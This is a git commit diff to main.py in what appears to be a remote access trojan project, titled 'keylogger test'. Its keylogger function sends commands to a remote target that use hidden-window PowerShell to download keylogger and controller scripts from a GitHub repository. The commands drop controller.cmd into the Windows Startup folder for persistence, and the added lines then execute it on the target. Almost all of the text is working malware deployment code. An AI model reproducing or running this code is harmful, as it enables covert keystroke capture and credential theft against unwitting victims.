a5b815b3d5f7f82de7c4b6af4aca96fddd3fb471
petros <petros@kali.kali>
2025-01-04 19:13:03 -0600

    keylogger test

--- main.py
+++ main.py
@@ -163,8 +163,9 @@ def keylogger(address, password, target_username, working_directory):
     # set commands-web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/keylogger.ps1 -OutFile {working_directory}/keylogger.ps1\""
     schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/schedule.ps1 -OutFile {working_directory}/schedule.ps1\""
-    controller_command = f'cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile controller.cmd'
+    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile controller.cmd"
     print("[+] Keylogger Ready")
+    execute_keylogger = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden ./controller.cmd"
     
     # execute command
     print("[*] Installing Keylogger")
@@ -173,9 +174,11 @@ def keylogger(address, password, target_username, working_directory):
     remote_command(address, password, schedule_command)
     print("[*] Installing Controller")
     remote_command(address, password, controller_command)
+    print("[+] Keylogger Installed Successfully\n")
     
-    print("[+] Keylogger Installed Successfully")
-
+    # run keylogger
+    print("[*] Executing the keylogger")
+    remote_command(address, password, execute_keylogger)
 
 # detects os
 def os_detection():
